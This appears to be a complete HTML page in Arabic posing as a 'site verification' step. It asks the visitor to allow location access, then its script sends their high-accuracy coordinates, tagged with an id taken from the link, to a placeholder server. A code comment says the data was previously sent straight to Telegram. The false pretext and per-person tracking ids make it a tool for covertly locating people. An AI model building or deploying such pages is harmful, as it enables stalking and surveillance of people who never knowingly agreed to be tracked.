<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الموقع</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: #f0f2f5; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="box">
        <h2>جاري التحقق من الموقع...</h2>
        <p id="msg">يرجى الضغط على "سماح" (Allow) لطلب الموقع.</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');

        // رابط سيرفر البايثون الخاص بك (استبدله برابط سيرفرك لاحقاً)
        const SERVER_URL = "https://your-python-server.com/save-location";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // إرسال الإحداثيات إلى سيرفر البايثون بدلاً من إرسالها مباشرة للتليغرام
                try {
                    await fetch(SERVER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ id: userId, lat: lat, lon: lon })
                    });
                    document.getElementById('msg').innerText = "تم التحقق بنجاح! يمكنك إغلاق الصفحة.";
                } catch (e) {
                    document.getElementById('msg').innerText = "حدث خطأ في الاتصال بالسيرفر.";
                }
            }, (err) => {
                document.getElementById('msg').innerText = "تم رفض الوصول للموقع أو تعذر التحديد.";
            }, { enableHighAccuracy: true });
        } else {
            document.getElementById('msg').innerText = "متصفحك لا يدعم الخدمة.";
        }
    </script>
</body>
</html>
